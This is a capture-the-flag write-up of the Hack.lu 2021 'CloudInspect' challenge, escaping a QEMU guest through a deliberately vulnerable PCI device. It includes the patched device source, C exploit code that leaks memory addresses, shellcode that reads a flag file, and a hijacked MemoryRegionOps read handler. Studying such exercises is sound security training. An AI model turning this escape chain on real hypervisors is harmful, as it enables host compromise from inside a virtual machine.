# CloudInspect

CloundInpect was a hypervisor exploitation challenge I did for the [Hack.lu event](https://flu.xxx).
I didn't succeed to flag it within the 48 hours :(. But anyway I hope this write up will be interesting to read!
The related files can be found [right here](https://github.com/ret2school/ctf/tree/master/2021/hack.lu/pwn/cloudinspect)

> After Whiterock released it's trading bot cloud with special Stonks Sockets another hedge fund, Castel, comes with some competition. The special feature here is called "cloudinspect".  
The `flag` is located right next to the hypervisor. Go get it!

## Vulnerable PCI device

We got several files:
```
$ ls
build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_chall.sh  vmlinuz-5.11.0-38-generic
```
Apparently, according to the `diff_chall.txt` , the provided qemu binary is patched with some vulnerable code. Let's take a look at the diff file:
```diff
diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
new file mode 100644
index 0000000000..f1c3f84b2a
--- /dev/null
+++ b/hw/misc/cloudinspect.c
@@ -0,0 +1,204 @@
+/*
+ * QEMU cloudinspect intentionally vulnerable PCI device
+ *
+ */
+
+#include "qemu/osdep.h"
+#include "qemu/units.h"
+#include "hw/pci/pci.h"
+#include "hw/hw.h"
+#include "hw/pci/msi.h"
+#include "qom/object.h"
+#include "qemu/module.h"
+#include "qapi/visitor.h"
+#include "sysemu/dma.h"
+
+#define TYPE_PCI_CLOUDINSPECT_DEVICE "cloudinspect"
+typedef struct CloudInspectState CloudInspectState;
+DECLARE_INSTANCE_CHECKER(CloudInspectState, CLOUDINSPECT,
+                         TYPE_PCI_CLOUDINSPECT_DEVICE)
+
+#define DMA_SIZE        4096
+#define CLOUDINSPECT_MMIO_OFFSET_CMD 0x78
+#define CLOUDINSPECT_MMIO_OFFSET_SRC 0x80
+#define CLOUDINSPECT_MMIO_OFFSET_DST 0x88
+#define CLOUDINSPECT_MMIO_OFFSET_CNT 0x90
+#define CLOUDINSPECT_MMIO_OFFSET_TRIGGER 0x98
+
+#define CLOUDINSPECT_VENDORID 0x1337
+#define CLOUDINSPECT_DEVICEID 0x1337
+#define CLOUDINSPECT_REVISION 0xc1
+
+#define CLOUDINSPECT_DMA_GET_VALUE      0x1
+#define CLOUDINSPECT_DMA_PUT_VALUE      0x2
+
+struct CloudInspectState {
+    PCIDevice pdev;
+    MemoryRegion mmio;
+    AddressSpace *as;
+
+    struct dma_state {
+        dma_addr_t src;
+        dma_addr_t dst;
+        dma_addr_t cnt;
+        dma_addr_t cmd;
+    } dma;
+    char dma_buf[DMA_SIZE];
+};
+
+static void cloudinspect_dma_rw(CloudInspectState *cloudinspect, bool write)
+{
+    if (write) {
+        uint64_t dst = cloudinspect->dma.dst;
+        // DMA_DIRECTION_TO_DEVICE: Read from an address space to PCI device
+        dma_memory_read(cloudinspect->as, cloudinspect->dma.src, cloudinspect->dma_buf + dst, cloudinspect->dma.cnt);
+    } else {
+        uint64_t src = cloudinspect->dma.src;
+        // DMA_DIRECTION_FROM_DEVICE: Write to address space from PCI device
+        dma_memory_write(cloudinspect->as, cloudinspect->dma.dst, cloudinspect->dma_buf + src, cloudinspect->dma.cnt);
+    }
+}
+
+static bool cloudinspect_DMA_op(CloudInspectState *cloudinspect, bool write) {
+    switch (cloudinspect->dma.cmd) {
+        case CLOUDINSPECT_DMA_GET_VALUE:
+        case CLOUDINSPECT_DMA_PUT_VALUE:
+            if (cloudinspect->dma.cnt > DMA_SIZE) {
+                return false;
+            }
+            cloudinspect_dma_rw(cloudinspect, write);
+            break;
+        default:
+            return false;
+    }
+
+    return true;
+}
+
+static uint64_t cloudinspect_mmio_read(void *opaque, hwaddr addr, unsigned size)
+{
+    CloudInspectState *cloudinspect = opaque;
+    uint64_t val = ~0ULL;
+
+    switch (addr) {
+    case 0x00:
+        val = 0xc10dc10dc10dc10d;
+        break;
+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
+        val = cloudinspect->dma.cmd;
+        break;
+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
+        val = cloudinspect->dma.src;
+        break;
+    case CLOUDINSPECT_MMIO_OFFSET_DST:
+        val = cloudinspect->dma.dst;
+        break;
+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
+        val = cloudinspect->dma.cnt;
+        break;
+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
+        val = cloudinspect_DMA_op(cloudinspect, false);
+        break;
+    }
+
+    return val;
+}
+
+static void cloudinspect_mmio_write(void *opaque, hwaddr addr, uint64_t val,
+                unsigned size)
+{
+    CloudInspectState *cloudinspect = opaque;
+
+    switch (addr) {
+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
+        cloudinspect->dma.cmd = val;
+        break;
+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
+        cloudinspect->dma.src = val;
+        break;
+    case CLOUDINSPECT_MMIO_OFFSET_DST:
+        cloudinspect->dma.dst = val;
+        break;
+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
+        cloudinspect->dma.cnt = val;
+        break;
+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
+        val = cloudinspect_DMA_op(cloudinspect, true);
+        break;
+    }
+}
+
+static const MemoryRegionOps cloudinspect_mmio_ops = {
+    .read = cloudinspect_mmio_read,
+    .write = cloudinspect_mmio_write,
+    .endianness = DEVICE_NATIVE_ENDIAN,
+    .valid = {
+        .min_access_size = 4,
+        .max_access_size = 8,
+    },
+    .impl = {
+        .min_access_size = 4,
+        .max_access_size = 8,
+    },
+
+};
+
+static void pci_cloudinspect_realize(PCIDevice *pdev, Error **errp)
+{
+    CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
+    // uint8_t *pci_conf = pdev->config;
+
+    if (msi_init(pdev, 0, 1, true, false, errp)) {
+        return;
+    }
+
+    cloudinspect->as = &address_space_memory;
+    memory_region_init_io(&cloudinspect->mmio, OBJECT(cloudinspect), &cloudinspect_mmio_ops, cloudinspect,
+                    "cloudinspect-mmio", 1 * MiB);
+    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &cloudinspect->mmio);
+}
+
+static void pci_cloudinspect_uninit(PCIDevice *pdev)
+{
+    // CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
+
+    msi_uninit(pdev);
+}
+
+static void cloudinspect_instance_init(Object *obj)
+{
+    // CloudInspectState *cloudinspect = CLOUDINSPECT(obj);
+}
+
+static void cloudinspect_class_init(ObjectClass *class, void *data)
+{
+    DeviceClass *dc = DEVICE_CLASS(class);
+    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);
+
+    k->realize = pci_cloudinspect_realize;
+    k->exit = pci_cloudinspect_uninit;
+    k->vendor_id = CLOUDINSPECT_VENDORID;
+    k->device_id = CLOUDINSPECT_DEVICEID;
+    k->revision = CLOUDINSPECT_REVISION;
+    k->class_id = PCI_CLASS_OTHERS;
+    set_bit(DEVICE_CATEGORY_MISC, dc->categories);
+}
+
+static void pci_cloudinspect_register_types(void)
+{
+    static InterfaceInfo interfaces[] = {
+        { INTERFACE_CONVENTIONAL_PCI_DEVICE },
+        { },
+    };
+    static const TypeInfo cloudinspect_info = {
+        .name          = TYPE_PCI_CLOUDINSPECT_DEVICE,
+        .parent        = TYPE_PCI_DEVICE,
+        .instance_size = sizeof(CloudInspectState),
+        .instance_init = cloudinspect_instance_init,
+        .class_init    = cloudinspect_class_init,
+        .interfaces = interfaces,
+    };
+
+    type_register_static(&cloudinspect_info);
+}
+type_init(pci_cloudinspect_register_types)
diff --git a/hw/misc/meson.build b/hw/misc/meson.build
index 1cd48e8a0f..5ff263ca2f 100644
--- a/hw/misc/meson.build
+++ b/hw/misc/meson.build
@@ -1,5 +1,6 @@
 softmmu_ss.add(when: 'CONFIG_APPLESMC', if_true: files('applesmc.c'))
 softmmu_ss.add(when: 'CONFIG_EDU', if_true: files('edu.c'))
+softmmu_ss.add(files('cloudinspect.c'))
 softmmu_ss.add(when: 'CONFIG_FW_CFG_DMA', if_true: files('vmcoreinfo.c'))
 softmmu_ss.add(when: 'CONFIG_ISA_DEBUG', if_true: files('debugexit.c'))
 softmmu_ss.add(when: 'CONFIG_ISA_TESTDEV', if_true: files('pc-testdev.c'))
```
The first thing I did when I saw this was to check out how `memory_region_init_io` and `pci_register_bar` functions work. It sounds a bit like like a kernel device which registers a few handlers for basic operations like read / write / ioctl. Very quickly I found two write up from dangokyo [this one]( https://dangokyo.me/2018/03/28/qemu-internal-pci-device/)  and [this other one](https://dangokyo.me/2018/03/25/hitb-xctf-2017-babyqemu-write-up/), I recommend you to check it out, they are pretty interesting and well written.

PCI stands for Peripheral Component Interconnect, that's a standard that describes the interactions between the cpu and the other physical devices. The PCI device handles the interactions between the system and the physical device. To do so,  the PCI handler is providing a physical address space to the kernel, reachable through the kernel abstractions from a particular virtual address space. This address can be used to cache some data, but that's mainly used to request a particular behavior from the kernel to the physical devices. These requests are written at a well defined offset in the PCI address space, that are the I/O registers. And in the same way, the devices are waiting for some values at these locations to trigger a particular behavior. Check out [thsis](https://tldp.org/LDP/tlk/dd/pci.html) and [this](https://www.kernel.org/doc/html/latest/PCI/pci.html#mmio-space-and-write-posting) to learn more about PCI devices!

Now we know a bit more about PCI devices, we can see that the patched code is a PCI interface between the linux guest operating system and .. *nothing*. That's just a vulnerable PCI device which allows us to read and write four I/O registers (`CNT`, `SRC`, `CMD` and `DST`). According to these registers, we can read and write at an arbitrary location. There is a check about the size we're requesting for read / write operations at a particular offset from the `dmabuf` base address, but since we control the offset it does not matter.

To write these registers from userland, we need to `mmap` the right `resource` file corresponding to the PCI device. Then we just have to read or write the mapped file at an offset corresponding to the the register we want to read / write. Furthermore, the arbitrary read / write primitives provided by the device need to read to / from a memory area from its physical address the data we want to read / write.

The resource file can be found by getting a shell on the machine to take a look at the output of the `lspci` command.
```
/ # lspci -v
00:01.0 Class 0601: 8086:7000
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:01.1 Class 0101: 8086:7010
00:02.0 Class 00ff: 1337:1337
```
The output of the command is structured like this:
```
Field 1 : 00:02.0 : bus number (00), device number (02) and function (0)
Field 2 : 00ff    : device class
Field 3 : 1337    : vendor ID
Field 4 : 1337    : device ID
```
According to the source code of the PCI device, the vendor ID and the device ID are `0x1337`, the resource file corresponding to the device is so `/sys/devices/pci0000:00/0000:00:02.0/resource0`.

## Device interactions

What we need to interact with the device is to get the physical address of a memory area we control, which would act like a shared buffer between our program and the PCI device. To do so we can `mmap` a few pages, `malloc` a buffer or just allocate onto the function's stackframe a large buffer. Given that I was following the thedangokyo's write up, I just retrieved a few functions he was using and especially for the shared buffer.

The function used to get the physical address corresponding to an arbitrary pointer is based on the `/proc/self/pagemap` pseudo-file, for which you can read the format [here](https://www.kernel.org/doc/Documentation/vm/pagemap.txt). The virt2phys function looks like this:
```c
uint64_t virt2phys(void* p)
{
		uint64_t virt = (uint64_t)p;
		assert((virt & 0xfff) == 0);
		int fd = open("/proc/self/pagemap", O_RDONLY);
		if (fd == -1)
				perror("open");
		uint64_t offset = (virt / 0x1000) * 8;
		// the pagemap associates each mapped page of the virtual address space 
		// with its PTE entry, the entry corresponding to the page is at address / PAGE_SZ
		// and because that's an array of 64 bits entry, to access the right entry, the
		// offset is multiplied per 8. 
		lseek(fd, offset, SEEK_SET);
		uint64_t phys;
		if (read(fd, &phys, 8 ) != 8)
				perror("read");
		assert(phys & (1ULL << 63));
		// asserts the bit IS_PRESENT is set
		phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
		// flips out the status bits, and shifts the physical frame address to 64 bits
		return phys;
```
To interact with the device we can write the code right bellow:
```c
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>

unsigned char* iomem;
unsigned char* dmabuf;
uint64_t dmabuf_phys_addr;
int fd;

#define PATH "/sys/devices/pci0000:00/0000:00:02.0/resource0"

void iowrite(uint64_t addr, uint64_t value)
{
		*((uint64_t*)(iomem + addr)) = value;
}

uint64_t ioread(uint64_t addr)
{
		return *((uint64_t*)(iomem + addr));
}

uint64_t write_dmabuf(uint64_t offt, uint64_t value) {
		*(uint64_t* )dmabuf = value;
		iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
		iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, offt);
		iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, 8);
		iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, dmabuf_phys_addr);
		iowrite(CLOUDINSPECT_MMIO_OFFSET_TRIGGER, 0x300);
		return 0;
}

uint64_t read_offt(uint64_t offt) {
		iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
		iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, offt);
		iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, 8);
		iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, dmabuf_phys_addr);
		ioread(CLOUDINSPECT_MMIO_OFFSET_TRIGGER);
		return *(uint64_t* )dmabuf;
}

int main() {
		int fd1 = open(PATH, O_RDWR | O_SYNC);
		if (-1 == fd1) {
				fprintf(stderr, "Cannot open %s\n", PATH);
				return -1;
		} // open resource0 to interact with the device
		
		iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd1, 0); // map resource0
		printf("iomem @ %p\n", iomem);
		
		fd = open("/proc/self/pagemap", O_RDONLY);
		if (fd < 0) {
				perror("open");
				exit(1);
		}

		dmabuf = malloc(0x1000);
		memset(dmabuf, '\x00', sizeof(dmabuf));
		if (MAP_FAILED == iomem) {
				return -1;
		}

		mlock(dmabuf, 0x1000); // trigger PAGE_FAULT to acually map the page
		dmabuf_phys_addr = virt2phys(dmabuf); // grab physical address according to pagemap
		printf("DMA buffer (virt) @ %p\n", dmabuf);
		printf("DMA buffer (phys) @ %p\n", (void*)dmabuf_phys_addr);
}
```

Now we can interact with the device we got two primitive of arbitrary read / write. The `read_offt` and `write_dmabuf` functions permit us to read / write a 8 bytes to an arbitrary offset from the `dmabuf` object address.

## Exploitation

I did a lot of things which didn't worked, so let's summarize all my thoughts:
- If we leak the object's address, we can write at any location for which we know the base address, for example overwrite GOT pointers (but it will not succeed because of RELRO).
- If we take a look at all the memory areas mapped in the qemu process we can see very large memory area in rwx, which means if we can leak its address and if we can redirect RIP, we just have to write and jmp on a shellcode written in this area.
- To achieve the leaks, given that the CloudInspectState structure is allocated on the heap, and that we can read / write at an arbitrary offset from the object's address we can:
	-  Scan heap memory for pointers to the qemu binary to leak the base address of the binary.
	- Scan heap memory  for pointers to the heap itself (next, prev pointers for freed objects for example), and then compute the object's address.
	- Scan heap memory to leak the rwx memory area
	- Scan all the memory area we can read to find a leak of the rwx memory area.
- To redirect RIP I thought to:
	- Overwrite the `destructor` function pointer in the `MemoryRegion` structure.
	- Write in a writable area a fake `MemoryRegionOps` structure  for which a certain handler points to our shellcode and make `CloudInspectState.mmio.ops` point to it.

According to the environment, scan the heap memory is not reliable at all. I succeed to leak the rwx memory area, the binary base address, the heap base address from some contiguous objects in the heap. To redirect RIP, for some reason, the `destructor` is never called, so we have to craft a fake `MemoryRegionOps` structure. And that's how I read the flag on the disk. But the issue is that remotely, the offset between the heap base and the object is not the same, furthermore, the offset for the rwx memory leak is I guess different as well. So we have to find a different way to leak the object and the rwx memory area.

### Leak some memory areas

To see where we can find pointers to the rwx memory area, we can make use of the `search` command in `pwndbg`:

```
pwndbg> vmmap                                                                                                                                                                              
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                                                                                                                            
    0x559a884e1000     0x559a88791000 r--p   2b0000 0      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a88791000     0x559a88c5d000 r-xp   4cc000 2b0000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a88c5d000     0x559a890ff000 r--p   4a2000 77c000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89100000     0x559a89262000 r--p   162000 c1e000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89262000     0x559a89353000 rw-p    f1000 d80000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89353000     0x559a89377000 rw-p    24000 0      [anon_559a89353]                                                                                                                    
    0x559a8a059000     0x559a8b0e7000 rw-p  108e000 0      [heap]                                                                                                                              
    0x7fc5f4000000     0x7fc5f4a37000 rw-p   a37000 0      [anon_7fc5f4000]                                                                                                              
    0x7fc5f4a37000     0x7fc5f8000000 ---p  35c9000 0      [anon_7fc5f4a37]                                                                                                                    
    0x7fc5fbe00000     0x7fc603e00000 rw-p  8000000 0      [anon_7fc5fbe00]                                                                                                                    
    0x7fc603e00000     0x7fc603e01000 ---p     1000 0      [anon_7fc603e00]                                                                                                                    
    0x7fc604000000     0x7fc643fff000 rwxp 3ffff000 0      [anon_7fc604000]                                                                                                                  
    [SKIP]
pwndbg> search -4 0x7fc60400 -w                                                                                                                                                                
[anon_559a89353] 0x559a89359002 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a8935904a 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a89359052 0x1600007fc60400                                                                                                                                               
[anon_559a89353] 0x559a8935905a 0x2d00007fc60400                                                                                                                                               
[anon_559a89353] 0x559a89359062 0xffd300007fc60400                                                                                                                                             
[anon_559a89353] 0x559a89359072 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a89372b2a 0x10100007fc60400                                                                                                                                              
[anon_559a89353] 0x559a89372bb2 0x100000007fc60400                                                                                                                                             
[anon_559a89353] 0x559a89372bba 0xf00000007fc60400                                                                                                                                             
[heap]          0x559a8a2dccf2 0x2d00007fc60400                                                                                                                                                
[heap]          0x559a8a2dccfa 0x7fc60400                                                                                                                                                      
[heap]          0x559a8a2dcd6a 0x7fc60400                                                                                                                                                      
[heap]          0x559a8a2dcefa 0xffd300007fc60400                                                                                                                                              
[heap]          0x559a8a2dcf18 0x7fc60400                                                                                                                                                      
[SKIP]
```
Given that we don't want to get the leak from heap because of the unreliability we can see that there are available leaks in a writable area of the binary in `anon_559a89353`, indeed the page address looks like a PIE based binary address or an heap address (but the address is not marked heap), and if we look more carefully, the page is contiguous to the last file mapped memory area. Now we can leak the rwx memory area, lets' find a way to leak object's address! I asked on the hack.lu discord a hint for this leak because didn't have any idea. And finally it's quite easy, we can just leak the `opaque` pointer in the `MemoryRegion` structure which points to the object's address.

If I summarize we have:
- A reliable leak of: 
	- the object's address with the `opaque` pointer
	- the binary base address (from the heap)
	- the rwx memory area (writable memory area that belongs to the binary).

Then we can write this code:
```c
// offset I got in gdb locally
uint64_t base = read_offt(0x10c0 + 8*3) - 0xdef90; // heap leak
uint64_t bss = base + 0xbc2000; // points to the anonnymous memory area right after the binary
uint64_t heap_base = read_offt(0x1000 + 8*3) - 0xf3bff0; // useless
uint64_t ops_struct = read_offt(-0xd0); // That's &ClouInspctState.mmio.ops
uint64_t addr_obj = read_offt(-(0xd0-8)) + 2568; // CloudInspectState.mmio.opaque
uint64_t leak_rwx = read_offt((bss + 0x6000) - addr_obj) & ~0xffff; // leak in the bss

printf("[*] ops_struct: %lx\n", ops_struct);
printf("[*] Binary base address: %lx\n", base);
printf("[*] Heap base address: %lx\n", heap_base);
printf("[*] Leak rwx: %lx\n", leak_rwx);
printf("[*] Addr obj: %lx\n", addr_obj);

/*
[*] ops_struct: 559a89173f20
[*] Binary base address: 559a88791000
[*] Heap base address: 559a8a0561d0
[*] Leak rwx: 7fc604000000
[*] Addr obj: 559a8af92f88
*/
```

### Write the shellcode

I choose to write a shellcode to read the flag at `leak_rwx + 0x5000`, a known location we can easily read and print from the program. The shellcode is very simple:

```nasm
mov rax, 2 ; SYS_open
push 0x67616c66 ; flag in little endian
mov rdi, rsp ; pointer flag string
mov rsi, 0 ; O_READ
mov rdx, 0x1fd ; mode ?
syscall
mov rdi, rax ; fd
xor rax, rax ; SYS_read
lea rsi, [rip] ; pointer to the rwx memory area (cause we're executing code within)
and rsi, 0xffffffffff000000 ; compute the base address
add rsi, 0x5000 ; add the right offset
mov rdx, 0x30 ; length of the flag to read
syscall
add rsp, 8; we pushed the flag str so we destroy it
ret ; return to continue the execution
```

To write the shellcode at `leak_rwx + 0x1000`, we can directly trigger a large write primitive:

```c
#define CODE "\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3"

memcpy(dmabuf, CODE, 130);

printf("[*] Writing the shellcode @ %lx\n", leak_rwx + 0x1000);
iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, leak_rwx - addr_obj + 0x1000);
iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, 130);
iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, dmabuf_phys_addr);
iowrite(CLOUDINSPECT_MMIO_OFFSET_TRIGGER, 0x300);
/*
[*] Writing the shellcode @ 7fc604001000
*/
```

### Craft fake MemoryRegionOps structure

To cratf a fake `MemoryRegionOps`, I just read the original `MemoryRegionOps` structure, I edited the `read` handler, and I wrote it back, in a writable memory area, at `leak_rwx+0x2000`. Given that `sizeof(MemoryRegionOps)` is not superior to `DMA_SIZE`, I can read and write in one time. Then we got:

```c
// Craft fake MemoryRegionOps structure by reading the original one

struct MemoryRegionOps fake_ops = {0};
printf("[*] reading struct mmio.MemoryRegionOps @ %lx\n", ops_struct);

iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, -(addr_obj - ops_struct));
iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, sizeof(struct MemoryRegionOps));
iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, dmabuf_phys_addr);
ioread(CLOUDINSPECT_MMIO_OFFSET_TRIGGER);

// Write it in the fake struct
memcpy(&fake_ops, dmabuf, sizeof(struct MemoryRegionOps));
fake_ops.read = (leak_rwx + 0x1000); 
// Edit the handler we want to hook to make it point to the shellcode at leak_rwx + 0x1000

printf("[*] fake_ops.read = %lx\n", leak_rwx + 0x1000);
memcpy(dmabuf, &fake_ops, sizeof(struct MemoryRegionOps));

// patch it and write it @ leak_rwx + 0x2000
iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, leak_rwx - addr_obj + 0x2000);
iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, sizeof(struct MemoryRegionOps));
iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, dmabuf_phys_addr);
iowrite(CLOUDINSPECT_MMIO_OFFSET_TRIGGER, 0x300);
```

### Hook mmio.ops + PROFIT

We just have to replace the original `CoudInspect.mmio.ops` pointer to a pointer to the `fake_ops` structure.
Then, next time we send a read request, the shellcode will be executed! And we will just need to retablish the original `CoudInspect.mmio.ops` pointer to read the flag at `leak_rwx+0x5000`! Which gives:
```c
ioread(0x37); // trigger the read handler we control, then the shellcode is 
// executed and the flag is written @ leak_rwx + 0x5000[enter link description here](cloudinspect)

printf("[*] CloudInspectState.mmio.ops.read () => jmp @ %lx\n", leak_rwx + 0x1000);

char flag[0x30] = {0};
// So we just have to read the flag @ leak_rwx + 0x5000

write_dmabuf(-0xd0, ops_struct);
printf("[*] CloudInspectState.mmio.ops = original ops\n");
printf("[*] Reading the flag @ %lx\n", leak_rwx + 0x5000);
iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, leak_rwx - addr_obj + 0x5000);
iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, 0x30);
iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, dmabuf_phys_addr);
if (!ioread(CLOUDINSPECT_MMIO_OFFSET_TRIGGER)) {
		perror("Failed to read the flag\n");
		return -1;
}

memcpy(flag, dmabuf, 0x30);
printf("flag: %s\n", flag);


// adresses are different because here is another execution on the remote challenge
/*
b'[*] CloudInspectState.mmio.ops.read () => jmp @ 7fe3dc001000\r\r\n'
b'[*] CloudInspectState.mmio.ops = original ops\r\r\n'
b'[*] Reading the flag @ 7fe3dc005000\r\r\n'
b'flag: flag{cloudinspect_inspects_your_cloud_0107}\r\r\n'

flag: flag{cloudinspect_inspects_your_cloud_0107}
*/
```

Thanks for the organizers for this awesome event! The other pwn challenges look like very interesting as well!
You can the finale exploit [here](https://github.com/ret2school/ctf/blob/master/2021/hack.lu/pwn/cloudinspect/remote.c).

## Resources
- [Interesting article about PCI devices](https://tldp.org/LDP/tlk/dd/pci.html)
- [Linux kernel PCI documentation](https://www.kernel.org/doc/Documentation/filesystems/sysfs-pci.txt)
- [Linux kernel pagemap documentation](https://www.kernel.org/doc/Documentation/vm/pagemap.txt)

